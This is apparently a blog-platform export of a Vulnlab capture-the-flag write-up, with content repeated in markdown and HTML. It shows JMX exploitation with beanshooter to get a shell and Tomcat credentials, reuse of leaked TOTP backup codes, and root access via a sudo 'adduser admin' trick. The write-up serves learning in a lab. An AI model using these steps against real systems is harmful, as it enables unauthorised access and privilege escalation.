the regular expression privileges that I described earlier, which limit us from adding anything else besides an alphanumeric string as an argument in the command.\n\n```\nuseradmin@manage:~/backups$ sudo /usr/sbin/adduser daz --system\n[sudo] password for useradmin:                                                                                                \nsudo: a password is required                                                                                                  \nuseradmin@manage:~/backups$ sudo /usr/sbin/adduser daz                \nAdding user `daz' ...                        \nAdding new group `daz' (1003) ...\nAdding new user `daz' (1003) with group `daz' ...\nCreating home directory `/home/daz' ...\nCopying files from `/etc/skel' ...\nNew password: \n```\n\nIf the binary ends up requiring us to enter in the `useradmin` password, this means that our string was not accepted and it WILL error out if you authenticate normally. We have `NOPASSWD` privileges for this binary, meaning it should work normally without a password if we use the command as intended.\n\nMy first thought when doing this was to see if there were any ways to exploit how Linux interprets regular expressions with their commands. I was able to trigger regex when attempting to use bash-specific characters like `!` and `\\`:\n\n```\nuseradmin@manage:~/backups$ sudo /usr/sbin/adduser daz!a       \nbash: !a: event not found\n```\n\nThough I wasn't able to get anywhere with it. I did however, find a solution when considering a specific user we could add while staying in the bounds of what the `adduser` binary can actually do.\n\nIf you try to add a user called `root`, it should produce an error that the `root` user already exists - because it does. However, if you look at the default `/etc/sudoers` [file on Ubuntu machines](https://gist.github.com/alitoufighi/679304d9585304075ba1ad93f80cce0e), you may find an interesting parameter that is there by default.\n\n![](/images/vulnlab/manage-vl/e.png)\n\nIt seems that users within the `admin` group also have all sudo privileges, much like the root user. \n\nHowever if you'll notice, there is no `admin` group within `/etc/group`.\n\n```\n......\nlandscape:x:117:\nfwupd-refresh:x:118:\nkarl:x:1000:\ntomcat:x:1001:\nuseradmin:x:1002:\ndaz:x:1003:\n```\n\nThis means that if we create a user named `admin`, it should be granted SUDO rights on the machine based on the `sudoers` file. Since there isn't a user/group already created, it will interpret the user's name as the group for it to add to. This is backed by the fact that our users are given a group of their same name if we run `cat /etc/group`, as listed above.\n\nSo if we create a user called admin, it should trick the Linux OS into creating an `admin` group which will give all users (one of which being our newly created user) SUDO rights on the filesystem.\n\n```\nuseradmin@manage:~/backups$ sudo /usr/sbin/adduser admin\nAdding user `admin' ...\nAdding new group `admin' (1004) ...\nAdding new user `admin' (1004) with group `admin' ...\nCreating home directory `/home/admin' ...\nCopying files from `/etc/skel' ...\nNew password: \nRetype new password: \npasswd: password updated successfully\nChanging the user information for admin\nEnter the new value, or press ENTER for the default\n        Full Name []: \n        Room Number []: \n        Work Phone []: \n        Home Phone []: \n        Other []: \nIs the information correct? [Y/n] Y\n```\n\nI gave the `admin` user the password `password`, and if we attempt to use `sudo su`:\n\n```\nuseradmin@manage:~/backups$ su admin\nPassword: \nTo run a command as administrator (user \"root\"), use \"sudo <command>\".\nSee \"man sudo_root\" for details.\n\nadmin@manage:/home/useradmin/backups$ sudo su\n[sudo] password for admin: \nroot@manage:/home/useradmin/backups# whoami\nroot\n```\n\nAs you can see, we were successfully able to login as `root`. The root flag is within `/root/root.txt`, and this means we have successfully compromised this machine!\n\n![](/images/vulnlab/manage-vl/f.png)\n\n# Conclusion\n\nThis box really helped with problem-solving and understanding how to properly exploit something if you just consider exactly how it's supposed to function. Don't get wrapped up into a rabbit hole by overthinking what you can exploit - instead take some time to think about the overarching functionality that something can do while also staying within the boundaries of its limits.\n\nGreat machine, big thanks again to fume and xct.\n\n# Resources\n\nhttps://docs.oracle.com/javase/8/docs/technotes/guides/rmi/index.html\nhttps://www.geeksforgeeks.org/remote-method-invocation-in-java/\nhttps://www.baeldung.com/java-management-extensions\nhttps://docs.oracle.com/javase%2Ftutorial%2F/jmx/mbeans/index.html#:~:text=An%20MBean%20is%20a%20managed,that%20needs%20to%20be%20managed.\nhttps://gist.github.com/alitoufighi/679304d9585304075ba1ad93f80cce0e\nhttps://kodekloud.com/blog/how-to-list-all-groups-in-linux/","source":"_posts/manage.md","raw":"---\ntitle: Manage - Vulnlab\ndate: 2024-07-03 19:54:31\ntags: [vulnlab, Easy]\ncategories: vulnlab\nkeywords: 'Vulnlab, Easy, Linux'\ndescription: Manage is one of the latest machines created by fume and xct, and it involves enumerating and exploiting a Java MBeans application that is tied to Apache Tomcat. Privilege escalation then involves general binary exploitation with sudo privileges.\ncover: /images/vulnlab/manage-vl/manage_slide.png\ntop_img: /images/cyberpunk-red.jpg\ntoc: true\ntoc_number: false\n---\n\nManage is one of the latest machines created by fume and xct, and it involves enumerating and exploiting a Java MBeans application that is tied to Apache Tomcat. Privilege escalation then involves general binary exploitation with sudo privileges.\n\n# Enumeration\n\n```\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-03 16:19 EDT\nNmap scan report for 10.10.89.27\nHost is up (0.11s latency).\nNot shown: 997 closed tcp ports (reset)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n2222/tcp open  EtherNetIP-1\n8080/tcp open  http-proxy\n\nNmap done: 1 IP address (1 host up) scanned in 4.00 seconds\n```\n\nAs we can see, it seems as though there are three ports open - SSH, a web-server behind a proxy, and finally a new service that I haven't seen before on port 8080.\n\nAssuming that we don't have access to SSH immediately, I went to the web server on port 8080 to see if there was anything we could access.\n\n![](/images/vulnlab/manage-vl/b.png)\n\nIt seems to be a relatively generic Apache Tomcat server, with the specific version of Tomcat being 10.1.19. \n\nI researched a bit into the Tomcat version, and there doesn't seem to be much to exploit for this specific instance. I also made sure to enumerate the directories, however there doesn't seem to be much that we can access from this specific web server.\n\n# Java RMI/RMX\n\nThis lead me to research into what the third port that we have, port 2222. I found that doing a bit of continued enumeration with NMAP allowed us to discover the actual service on this port.\n\n```\n└─$ sudo nmap -A -p2222 10.10.89.27\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-03 16:36 EDT\nNmap scan report for 10.10.89.27\nHost is up (0.11s latency).\n\nPORT     STATE SERVICE  VERSION\n2222/tcp open  java-rmi Java RMI\n| rmi-dumpregistry: \n|   jmxrmi\n|     javax.management.remote.rmi.RMIServerImpl_Stub\n|     @127.0.1.1:32877\n|     extends\n|       java.rmi.server.RemoteStub\n|       extends\n|_        java.rmi.server.RemoteObject\n|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)\n```\n\nThe service seems to be [Java RMI](https://docs.oracle.com/javase/8/docs/technotes/guides/rmi/index.html), the Java Remote Method Invocation API. This API allows the developer to create Java-based technology and connect it with Java-based applications. This allows the developer to invoke Java objects on other Java machines within the application environment, and also serialize user objects by supporting object-oriented polymorphism.\n\nIn much simpler terms, this allows developers to invoke a pre-created Java method onto an object that is from another address space. This space can live on either the same machine or another machine that has access to the RMI space.\n\nRemote machines can invoke methods on a the JVM (Java Virtual Machine) whether that be on the same machine (client-side) or on another machine as described previously (sever-side). RMI will automatically create a public server so that these client and server-side communications can be invoked with simple method calls.\n\nYou'll also notice that there seems to be a JMX instance tied to this RMI functionality. JMX is the Java Management Extensions framework that allows for easy and reliable configuration of a Java application whether that be remotely or locally. This introduces the concept of MBeans, which is a managed java object that follows patterns set by the JMX application.\n\nA JMX architecture can consist of the following (credit goes to [Baeldung](https://www.baeldung.com/java-management-extensions)):\n\n1. **Instrumentation Layer:** MBeans registered with the JMX agent through which resources are managed.\n2. **JMX Agent Layer:** the core component (MBeanServer) which maintains registry of managed MBeans and provides an interface to access them.\n3. **Remote Management Layer:** usually client side tool like JConsole.\n\nWrapping this all together, a developer can manage MBeans objects within a JMX application and integrate them into a JMI application through either client or server-side communication integration.\n\nSince this allows for a client on a remote virtual machine to interact with the JMI/JMX instance, we have the potential to exploit this for either enumeration or remote code execution.\n\n# Attacking JMX with Beanshooter\n\nSince I'm not the most prominent Java developer in the slightest, I decided to do some research on JMX tools online that could do enumeration for us. After a bit of time, I came across [beanshooter](https://github.com/qtc-de/beanshooter) by qtc.\n\nBeanshooter is an RMX enumeration and attacking tool that helps identify vulnerabilities in JMX applications. With this tool, we can enumerate the JMX environment by utilizing Java object invocation on certain methods in the application.\n\nThe GitHub repository listed has the basic installation for the utility, though you'll need to make sure you have both Maven and a linked JDK installation. Your java version that is installed by default should already link itself to maven automatically, though this [resource](https://www.digitalocean.com/community/tutorials/install-maven-linux-ubuntu) seemed to help me when I was troubleshooting initially.\n\n```\n└─$ mvn --version\nPicked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true\nApache Maven 3.8.7\nMaven home: /usr/share/maven\nJava version: 17.0.11, vendor: Debian, runtime: /usr/lib/jvm/java-17-openjdk-amd64\nDefault locale: en, platform encoding: UTF-8\n```\n\nYou can then compile the beanshooter repository by executing `mvn package` within the root directory of the GitHub repo. \n\nThis should build the Java binary within `/target`.\n\n```\n-rw-rw-r--  1 daz daz 4584431 Jul  2 16:57 beanshooter-4.1.0-jar-with-dependencies.jar\n```\n\nYou can then execute this binary by running it against the `java` command-line tool.\n\n```\n└─$ java -jar beanshooter-4.1.0-jar-with-dependencies.jar -h                          \nPicked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true\nusage: beanshooter [-h]   ...\n\nbeanshooter v4.1.0 - a JMX enumeration and attacking tool\n......\n```\n\nNow that we have the utility downloaded, let's enumerate the target environment. You can do so by using the `enum` argument parameter which will enumerate the target server for common JMX vulnerabilities. There aren't any positional arguments that we need aside from the host and port of the target server.\n\n```\n└─$ java -jar beanshooter-4.1.0-jar-with-dependencies.jar enum 10.10.89.27 2222\nPicked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true\n[+] Checking available bound names:\n[+]\n[+]     * jmxrmi (JMX endpoint: 127.0.1.1:32877)\n[+]\n[+] Checking for unauthorized access:\n[+]\n[+]     - Remote MBean server does not require authentication.\n[+]       Vulnerability Status: Vulnerable\n......\n[+] Enumerating tomcat users:\n[+]\n[+]     - Listing 2 tomcat users:\n[+]\n[+]             ----------------------------------------\n[+]             Username:  manager\n[+]             Password:  [...snip...]\n[+]             Roles:\n[+]                        Users:type=Role,rolename=\"manage-gui\",database=UserDatabase\n[+]\n[+]             ----------------------------------------\n[+]             Username:  admin\n[+]             Password:  [...snip...]\n[+]             Roles:\n[+]                        Users:type=Role,rolename=\"role1\",database=UserDatabase\n```\n\nAs you can see, the enumeration functionality was able to verify a common vulnerability within this specific JMX server. It seems as though in our scenario, the JMX service does not require authentication.\n\nIt also was able to successfully enumerate two tomcat users, `manager` and `admin`, along with their plaintext passwords. Should we have needed to brute-force the application to check for weak passwords, we could use `beanshooter`'s `brute` functionality.\n\nNow that we have credentials to the JMX application, we can simply call a standard shell invocation using `beanshooter`'s `standard` functionality.\n\n```\n└─$ java -jar beanshooter-4.1.0-jar-with-dependencies.jar standard 10.10.89.27 2222 tonka\nPicked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true\n[+] Creating a TemplateImpl payload object to abuse StandardMBean\n[+]\n[+]     Deplyoing MBean: StandardMBean\n[+]     MBean with object name de.qtc.beanshooter:standard=5272461178416 was successfully deployed.\n```\n\nAs you can see, an MBean object that abuses the `StandardMBean` method was deployed on the target webserver. We can call this tonka object by calling it directly from our client-side session to create a command-line session.\n\n```\n└─$ java -jar beanshooter-4.1.0-jar-with-dependencies.jar tonka shell 10.10.89.27 2222 \nPicked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true\n[tomcat@10.10.89.27 /]$ whoami\ntomcat\n[tomcat@10.10.89.27 /]$ \n```\n\nAs you can see, a command-line session was generated as the `tomcat` user. I stood up a Sliver C2 session at this point, just to get a proper shell since I noticed I couldn't execute some commands (that you'll see us do later) for basic Bash usage, like `su` or `sudo`.\n\n![](/images/vulnlab/manage-vl/c.png)\n\n# Pivoting via Google Authenticator\n\nDoing a bit of a enumeration onto the internal filesystem seems to show us that there are two users in the `/home` directory.\n\n```\ntomcat@manage:/tmp$ ls /home\nkarl  useradmin\ntomcat@manage:/tmp$ ls -la /home\ntotal 16\ndrwxr-xr-x  4 root      root      4096 Jun 21 15:46 .\ndrwxr-xr-x 19 root      root      4096 Mar  1 04:20 ..\ndrwxr-xr-x  3 karl      karl      4096 Jun 21 16:51 karl\ndrwxr-xr-x  5 useradmin useradmin 4096 Jun 21 16:51 useradmin\n```\n\nGiven that we have two usernames and passwords from our enumeration of the JMX environment earlier, I decided to see if either of these users had the same password associated with their account. While I didn't get a direct match immediately, I did notice that a new prompt appeared for the local `useradmin` user when entering in the JMX `admin` user's password from before.\n\n```\n[+]             Username:  admin\n[+]             Password:  [...snip...]\n```\n\n![](/images/vulnlab/manage-vl/d.png)\n\nIt seems that the `useradmin`'s password is the same as the `admin` user that we saw from before. It didn't give us an authentication error message and instead prompted us to enter in a verification code.\n\nI've tested using Linux authentication tied to secondary authentication/MFA, so I know there must be some form of authentication tied to the `useradmin`'s user. I'm more familiar with using Google authenticator for this, so I decided to do a recursive search for any Google authenticator files on the filesystem.\n\n```\ntomcat@manage:/tmp$ find / -name *google* 2>/dev/null\n......\n/home/useradmin/.google_authenticator\n......\n```\n\nI found an odd file denoted as `.google_authenticator` within the home directory for `useradmin`. I wouldn't expect for us to be able to access this, however I noticed that `useradmin` did not have restricted access for the everyone group on the filesystem - meaning we could access their home directory.\n\nUpon trying to access their file, we can see that we don't have access to it. We do however have read access to the `backups` directory within their home folder.\n\n```\ntomcat@manage:/home/useradmin/backups$ ls -la\ntotal 12\ndrwxrwxr-x 2 useradmin useradmin 4096 Jun 21 16:51 .\ndrwxr-xr-x 5 useradmin useradmin 4096 Jul  3 22:59 ..\n-rw-rw-r-- 1 useradmin useradmin 3088 Jun 21 16:50 backup.tar.gz\n```\n\nIt seems that a tar/gzip archive exists in this backups directory. I pulled this to my local machine by downloading it through Sliver, and unzipped the archive to see its contents.\n\n```\n└─$ tar -xzf backup.tar.gz \n\n└─$ ls -la          \ntotal 36\ndrwxr-xr-x 4 daz daz 4096 Jun 21 12:48 .\ndrwxr-xr-x 8 daz daz 4096 Jul  3 16:17 ..\nlrwxrwxrwx 1 daz daz    9 Jun 21 11:48 .bash_history -> /dev/null\n-rw-r--r-- 1 daz daz  220 Jun 21 11:46 .bash_logout\n-rw-r--r-- 1 daz daz 3771 Jun 21 11:46 .bashrc\ndrwx------ 2 daz daz 4096 Jun 21 12:48 .cache\n-r-------- 1 daz daz  200 Jun 21 12:48 .google_authenticator\n-rw-r--r-- 1 daz daz  807 Jun 21 11:46 .profile\ndrwxrwxr-x 2 daz daz 4096 Jun 21 11:53 .ssh\n-rw-rw-r-- 1 daz daz 3088 Jul  3 19:08 backup.tar.gz\n```\n\nIt seems that a similar `.google_authenticator` file was decompressed from the archive. If we read this file, we can see that there are a plethora of verification codes that are within this file.\n\n```\n└─$ cat .google_authenticator \nCLSSSMHYGLENX5HAIFBQ6L35UM\n\" RATE_LIMIT 3 30 1718988529\n\" WINDOW_SIZE 3\n\" DISALLOW_REUSE 57299617\n\" TOTP_AUTH\n[...snip...]\n```\n\nBased on the `RATE_LIMIT`, my guess is that we can only use these backup verification codes three times every 30 minutes or they refresh every 30 minutes.\n\nIf we attempt to log in as `useradmin` with their password and one of these verification codes (I used 99852083), we can see that the codes seem to work and we are able to login as `useradmin`.\n\n```\ntomcat@manage:/home/useradmin/backups$ su useradmin\nPassword: \nVerification code: \nuseradmin@manage:~/backups$\n```\n\nI made sure to execute my Sliver binary again so we aren't required to use another token for a login attempt.\n\n# Privilege Escalation via Admin Group\n\nUpon getting access to `useradmin`, I immediately ran `sudo -l` to see if we had sudo access to any binaries on the filesystem.\n\n```\ntomcat@manage:/home/useradmin/backups$ su useradmin\nPassword: \nVerification code: \nuseradmin@manage:~/backups$ sudo -l\nMatching Defaults entries for useradmin on manage:\n    env_reset, timestamp_timeout=1440, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin,\n    use_pty\n\nUser useradmin may run the following commands on manage:\n    (ALL : ALL) NOPASSWD: /usr/sbin/adduser ^[a-zA-Z0-9]+$\n```\n\nWe seem to have sudo access to `/usr/sbin/adduser`, though you'll notice that a string of text is following the command.\n\nI did some research into specifically what this meant, and it seems to be a string of characters followed by regular expression variables that limit the extent of the command.\n\n* `^` indicates that the start of a line.\n* `[a-zA-Z0-9]` indicates any set of alphanumeric characters.\n* `+` means that we can add an unlimited amount of characters, given that they fall under the prerequisites of the previous regex statement (alphanumeric).\n* `$` indicates the end of the line.\n\nThis essentially means that we only have the ability to enter in a string for `adduser`, limiting what we essentially are able to do.\n\nThe `/usr/sbin/adduser` binary seems to just be adding a user. The interesting part is that a `--system` function exists in that binary which seems to allow us to add a system privileged (root-level) user. The only issue is the regular expression privileges that I described earlier, which limit us from adding anything else besides an alphanumeric string as an argument in the command.\n\n```\nuseradmin@manage:~/backups$ sudo /usr/sbin/adduser daz --system\n[sudo] password for useradmin:                                                                                                \nsudo: a password is required                                                                                                  \nuseradmin@manage:~/backups$ sudo /usr/sbin/adduser daz                \nAdding user `daz' ...                        \nAdding new group `daz' (1003) ...\nAdding new user `daz' (1003) with group `daz' ...\nCreating home directory `/home/daz' ...\nCopying files from `/etc/skel' ...\nNew password: \n```\n\nIf the binary ends up requiring us to enter in the `useradmin` password, this means that our string was not accepted and it WILL error out if you authenticate normally. We have `NOPASSWD` privileges for this binary, meaning it should work normally without a password if we use the command as intended.\n\nMy first thought when doing this was to see if there were any ways to exploit how Linux interprets regular expressions with their commands. I was able to trigger regex when attempting to use bash-specific characters like `!` and `\\`:\n\n```\nuseradmin@manage:~/backups$ sudo /usr/sbin/adduser daz!a       \nbash: !a: event not found\n```\n\nThough I wasn't able to get anywhere with it. I did however, find a solution when considering a specific user we could add while staying in the bounds of what the `adduser` binary can actually do.\n\nIf you try to add a user called `root`, it should produce an error that the `root` user already exists - because it does. However, if you look at the default `/etc/sudoers` [file on Ubuntu machines](https://gist.github.com/alitoufighi/679304d9585304075ba1ad93f80cce0e), you may find an interesting parameter that is there by default.\n\n![](/images/vulnlab/manage-vl/e.png)\n\nIt seems that users within the `admin` group also have all sudo privileges, much like the root user. \n\nHowever if you'll notice, there is no `admin` group within `/etc/group`.\n\n```\n......\nlandscape:x:117:\nfwupd-refresh:x:118:\nkarl:x:1000:\ntomcat:x:1001:\nuseradmin:x:1002:\ndaz:x:1003:\n```\n\nThis means that if we create a user named `admin`, it should be granted SUDO rights on the machine based on the `sudoers` file. Since there isn't a user/group already created, it will interpret the user's name as the group for it to add to. This is backed by the fact that our users are given a group of their same name if we run `cat /etc/group`, as listed above.\n\nSo if we create a user called admin, it should trick the Linux OS into creating an `admin` group which will give all users (one of which being our newly created user) SUDO rights on the filesystem.\n\n```\nuseradmin@manage:~/backups$ sudo /usr/sbin/adduser admin\nAdding user `admin' ...\nAdding new group `admin' (1004) ...\nAdding new user `admin' (1004) with group `admin' ...\nCreating home directory `/home/admin' ...\nCopying files from `/etc/skel' ...\nNew password: \nRetype new password: \npasswd: password updated successfully\nChanging the user information for admin\nEnter the new value, or press ENTER for the default\n        Full Name []: \n        Room Number []: \n        Work Phone []: \n        Home Phone []: \n        Other []: \nIs the information correct? [Y/n] Y\n```\n\nI gave the `admin` user the password `password`, and if we attempt to use `sudo su`:\n\n```\nuseradmin@manage:~/backups$ su admin\nPassword: \nTo run a command as administrator (user \"root\"), use \"sudo <command>\".\nSee \"man sudo_root\" for details.\n\nadmin@manage:/home/useradmin/backups$ sudo su\n[sudo] password for admin: \nroot@manage:/home/useradmin/backups# whoami\nroot\n```\n\nAs you can see, we were successfully able to login as `root`. The root flag is within `/root/root.txt`, and this means we have successfully compromised this machine!\n\n![](/images/vulnlab/manage-vl/f.png)\n\n# Conclusion\n\nThis box really helped with problem-solving and understanding how to properly exploit something if you just consider exactly how it's supposed to function. Don't get wrapped up into a rabbit hole by overthinking what you can exploit - instead take some time to think about the overarching functionality that something can do while also staying within the boundaries of its limits.\n\nGreat machine, big thanks again to fume and xct.\n\n# Resources\n\nhttps://docs.oracle.com/javase/8/docs/technotes/guides/rmi/index.html\nhttps://www.geeksforgeeks.org/remote-method-invocation-in-java/\nhttps://www.baeldung.com/java-management-extensions\nhttps://docs.oracle.com/javase%2Ftutorial%2F/jmx/mbeans/index.html#:~:text=An%20MBean%20is%20a%20managed,that%20needs%20to%20be%20managed.\nhttps://gist.github.com/alitoufighi/679304d9585304075ba1ad93f80cce0e\nhttps://kodekloud.com/blog/how-to-list-all-groups-in-linux/","slug":"manage","published":1,"updated":"2024-07-03T23:59:09.170Z","_id":"cly6i0wne000080uf3r7keaqy","comments":1,"layout":"post","photos":[],"content":"<p>Manage is one of the latest machines created by fume and xct, and it involves enumerating and exploiting a Java MBeans application that is tied to Apache Tomcat. Privilege escalation then involves general binary exploitation with sudo privileges.</p>\n<h1 id=\"Enumeration\"><a href=\"#Enumeration\" class=\"headerlink\" title=\"Enumeration\"></a>Enumeration</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-03 16:19 EDT</span><br><span class=\"line\">Nmap scan report for 10.10.89.27</span><br><span class=\"line\">Host is up (0.11s latency).</span><br><span class=\"line\">Not shown: 997 closed tcp ports (reset)</span><br><span class=\"line\">PORT     STATE SERVICE</span><br><span class=\"line\">22/tcp   open  ssh</span><br><span class=\"line\">2222/tcp open  EtherNetIP-1</span><br><span class=\"line\">8080/tcp open  http-proxy</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 4.00 seconds</span><br></pre></td></tr></table></figure>\n\n<p>As we can see, it seems as though there are three ports open - SSH, a web-server behind a proxy, and finally a new service that I haven’t seen before on port 8080.</p>\n<p>Assuming that we don’t have access to SSH immediately, I went to the web server on port 8080 to see if there was anything we could access.</p>\n<p><img src=\"/images/vulnlab/manage-vl/b.png\"></p>\n<p>It seems to be a relatively generic Apache Tomcat server, with the specific version of Tomcat being 10.1.19. </p>\n<p>I researched a bit into the Tomcat version, and there doesn’t seem to be much to exploit for this specific instance. I also made sure to enumerate the directories, however there doesn’t seem to be much that we can access from this specific web server.</p>\n<h1 id=\"Java-RMI-RMX\"><a href=\"#Java-RMI-RMX\" class=\"headerlink\" title=\"Java RMI&#x2F;RMX\"></a>Java RMI&#x2F;RMX</h1><p>This lead me to research into what the third port that we have, port 2222. I found that doing a bit of continued enumeration with NMAP allowed us to discover the actual service on this port.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ sudo nmap -A -p2222 10.10.89.27</span><br><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-03 16:36 EDT</span><br><span class=\"line\">Nmap scan report for 10.10.89.27</span><br><span class=\"line\">Host is up (0.11s latency).</span><br><span class=\"line\"></span><br><span class=\"line\">PORT     STATE SERVICE  VERSION</span><br><span class=\"line\">2222/tcp open  java-rmi Java RMI</span><br><span class=\"line\">| rmi-dumpregistry: </span><br><span class=\"line\">|   jmxrmi</span><br><span class=\"line\">|     javax.management.remote.rmi.RMIServerImpl_Stub</span><br><span class=\"line\">|     @127.0.1.1:32877</span><br><span class=\"line\">|     extends</span><br><span class=\"line\">|       java.rmi.server.RemoteStub</span><br><span class=\"line\">|       extends</span><br><span class=\"line\">|_        java.rmi.server.RemoteObject</span><br><span class=\"line\">|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)</span><br></pre></td></tr></table></figure>\n\n<p>The service seems to be <a href=\"https://docs.oracle.com/javase/8/docs/technotes/guides/rmi/index.html\">Java RMI</a>, the Java Remote Method Invocation API. This API allows the developer to create Java-based technology and connect it with Java-based applications. This allows the developer to invoke Java objects on other Java machines within the application environment, and also serialize user objects by supporting object-oriented polymorphism.</p>\n<p>In much simpler terms, this allows developers to invoke a pre-created Java method onto an object that is from another address space. This space can live on either the same machine or another machine that has access to the RMI space.</p>\n<p>Remote machines can invoke methods on a the JVM (Java Virtual Machine) whether that be on the same machine (client-side) or on another machine as described previously (sever-side). RMI will automatically create a public server so that these client and server-side communications can be invoked with simple method calls.</p>\n<p>You’ll also notice that there seems to be a JMX instance tied to this RMI functionality. JMX is the Java Management Extensions framework that allows for easy and reliable configuration of a Java application whether that be remotely or locally. This introduces the concept of MBeans, which is a managed java object that follows patterns set by the JMX application.</p>\n<p>A JMX architecture can consist of the following (credit goes to <a href=\"https://www.baeldung.com/java-management-extensions\">Baeldung</a>):</p>\n<ol>\n<li><strong>Instrumentation Layer:</strong> MBeans registered with the JMX agent through which resources are managed.</li>\n<li><strong>JMX Agent Layer:</strong> the core component (MBeanServer) which maintains registry of managed MBeans and provides an interface to access them.</li>\n<li><strong>Remote Management Layer:</strong> usually client side tool like JConsole.</li>\n</ol>\n<p>Wrapping this all together, a developer can manage MBeans objects within a JMX application and integrate them into a JMI application through either client or server-side communication integration.</p>\n<p>Since this allows for a client on a remote virtual machine to interact with the JMI&#x2F;JMX instance, we have the potential to exploit this for either enumeration or remote code execution.</p>\n<h1 id=\"Attacking-JMX-with-Beanshooter\"><a href=\"#Attacking-JMX-with-Beanshooter\" class=\"headerlink\" title=\"Attacking JMX with Beanshooter\"></a>Attacking JMX with Beanshooter</h1><p>Since I’m not the most prominent Java developer in the slightest, I decided to do some research on JMX tools online that could do enumeration for us. After a bit of time, I came across <a href=\"https://github.com/qtc-de/beanshooter\">beanshooter</a> by qtc.</p>\n<p>Beanshooter is an RMX enumeration and attacking tool that helps identify vulnerabilities in JMX applications. With this tool, we can enumerate the JMX environment by utilizing Java object invocation on certain methods in the application.</p>\n<p>The GitHub repository listed has the basic installation for the utility, though you’ll need to make sure you have both Maven and a linked JDK installation. Your java version that is installed by default should already link itself to maven automatically, though this <a href=\"https://www.digitalocean.com/community/tutorials/install-maven-linux-ubuntu\">resource</a> seemed to help me when I was troubleshooting initially.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ mvn --version</span><br><span class=\"line\">Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true</span><br><span class=\"line\">Apache Maven 3.8.7</span><br><span class=\"line\">Maven home: /usr/share/maven</span><br><span class=\"line\">Java version: 17.0.11, vendor: Debian, runtime: /usr/lib/jvm/java-17-openjdk-amd64</span><br><span class=\"line\">Default locale: en, platform encoding: UTF-8</span><br></pre></td></tr></table></figure>\n\n<p>You can then compile the beanshooter repository by executing <code>mvn package</code> within the root directory of the GitHub repo. </p>\n<p>This should build the Java binary within <code>/target</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">-rw-rw-r--  1 daz daz 4584431 Jul  2 16:57 beanshooter-4.1.0-jar-with-dependencies.jar</span><br></pre></td></tr></table></figure>\n\n<p>You can then execute this binary by running it against the <code>java</code> command-line tool.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ java -jar beanshooter-4.1.0-jar-with-dependencies.jar -h                          </span><br><span class=\"line\">Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true</span><br><span class=\"line\">usage: beanshooter [-h]   ...</span><br><span class=\"line\"></span><br><span class=\"line\">beanshooter v4.1.0 - a JMX enumeration and attacking tool</span><br><span class=\"line\">......</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have the utility downloaded, let’s enumerate the target environment. You can do so by using the <code>enum</code> argument parameter which will enumerate the target server for common JMX vulnerabilities. There aren’t any positional arguments that we need aside from the host and port of the target server.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ java -jar beanshooter-4.1.0-jar-with-dependencies.jar enum 10.10.89.27 2222</span><br><span class=\"line\">Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true</span><br><span class=\"line\">[+] Checking available bound names:</span><br><span class=\"line\">[+]</span><br><span class=\"line\">[+]     * jmxrmi (JMX endpoint: 127.0.1.1:32877)</span><br><span class=\"line\">[+]</span><br><span class=\"line\">[+] Checking for unauthorized access:</span><br><span class=\"line\">[+]</span><br><span class=\"line\">[+]     - Remote MBean server does not require authentication.</span><br><span class=\"line\">[+]       Vulnerability Status: Vulnerable</span><br><span class=\"line\">......</span><br><span class=\"line\">[+] Enumerating tomcat users:</span><br><span class=\"line\">[+]</span><br><span class=\"line\">[+]     - Listing 2 tomcat users:</span><br><span class=\"line\">[+]</span><br><span class=\"line\">[+]             ----------------------------------------</span><br><span class=\"line\">[+]             Username:  manager</span><br><span class=\"line\">[+]             Password:  [...snip...]</span><br><span class=\"line\">[+]             Roles:</span><br><span class=\"line\">[+]                        Users:type=Role,rolename=&quot;manage-gui&quot;,database=UserDatabase</span><br><span class=\"line\">[+]</span><br><span class=\"line\">[+]             ----------------------------------------</span><br><span class=\"line\">[+]             Username:  admin</span><br><span class=\"line\">[+]             Password:  [...snip...]</span><br><span class=\"line\">[+]             Roles:</span><br><span class=\"line\">[+]                        Users:type=Role,rolename=&quot;role1&quot;,database=UserDatabase</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, the enumeration functionality was able to verify a common vulnerability within this specific JMX server. It seems as though in our scenario, the JMX service does not require authentication.</p>\n<p>It also was able to successfully enumerate two tomcat users, <code>manager</code> and <code>admin</code>, along with their plaintext passwords. Should we have needed to brute-force the application to check for weak passwords, we could use <code>beanshooter</code>‘s <code>brute</code> functionality.</p>\n<p>Now that we have credentials to the JMX application, we can simply call a standard shell invocation using <code>beanshooter</code>‘s <code>standard</code> functionality.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ java -jar beanshooter-4.1.0-jar-with-dependencies.jar standard 10.10.89.27 2222 tonka</span><br><span class=\"line\">Picked up _JAVA_OPTIONS: 